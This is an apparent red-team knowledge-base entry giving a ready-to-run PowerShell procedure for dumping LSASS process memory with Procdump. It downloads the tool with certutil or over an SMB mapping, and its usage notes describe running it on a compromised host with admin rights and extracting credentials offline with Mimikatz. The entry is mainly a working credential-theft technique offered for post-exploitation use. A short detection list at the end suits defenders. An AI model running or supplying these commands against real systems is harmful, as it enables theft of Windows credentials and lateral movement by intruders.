---
id: 172ef57c-764b-446f-96b1-597115e60121
name: windows-procdump-lsass-dump-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:27.176863+00:00'
updated_at: '2023-04-10T20:37:14.794613+00:00'
platforms:
  - Windows
tags:
  - dump
  - lsass
  - procdump
validated: true
---

# windows-procdump-lsass-dump-script

## Code

```powershell
# HTTP method - using the default way
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# SMB method - using the pid
net use Z: https://live.sysinternals.com
tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```

## Description

This PowerShell script provides complete workflows for dumping LSASS memory using Procdump via HTTP download or SMB share access, including PID discovery. It can be executed as a one-liner or saved as .ps1 for reuse in post-exploitation scenarios.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $lsass_pid | PID of LSASS process | 1234 |

## Usage

Run in PowerShell on a compromised Windows host with admin rights. For SMB, correct the net use to \\live.sysinternals.com\tools if needed. The script generates lsass.dmp for offline analysis with Mimikatz (e.g., sekurlsa::minidump).

## Detection

- PowerShell execution logging (Module/ScriptBlock).
- Network connections to live.sysinternals.com.
- File creation of procdump.exe or lsass.dmp in user directories.
- Process spawning: certutil.exe, procdump.exe.

## Related

- [[procedures/windows-lsass-mini-dump-for-mimikatz]]
